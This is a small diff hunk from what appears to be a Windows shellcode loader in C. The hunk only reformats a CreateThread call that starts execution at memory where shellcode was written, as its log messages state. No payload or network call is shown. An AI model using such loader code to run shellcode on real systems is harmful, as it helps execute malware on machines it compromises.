@@ -43,12 +43,11 @@ int main(int argc, char** argv){
 
 	printf("[+] Shellcode is written to allocated memory\n");
 	
-	HANDLE hThread = CreateThread(NULL, 
-								  0,
-								  (LPTHREAD_START_ROUTINE)allocated_mem,
-								  NULL, 
-								  0, 
-								  NULL);
+	HANDLE hThread = CreateThread(NULL, 0,
+				      (LPTHREAD_START_ROUTINE)allocated_mem,
+				      NULL, 
+				      0, 
+				      NULL);
 	
 	if (hThread == NULL) {
 		printf("[-] Failed to create thread:%d\n", GetLastError());
